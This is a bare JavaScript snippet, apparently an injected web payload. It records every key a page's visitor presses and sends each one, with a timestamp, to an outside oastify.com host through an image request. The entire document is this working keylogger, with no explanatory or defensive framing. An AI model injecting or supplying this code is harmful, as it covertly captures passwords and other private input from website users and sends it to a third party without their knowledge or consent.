document.addEventListener('keydown', function(e) {
    new Image().src = `https://ynpz6qkmf7olx7g9xckd2sntxk3br3pre.oastify.com/log?key=${encodeURIComponent(e.key)}&time=${Date.now()}`;
});
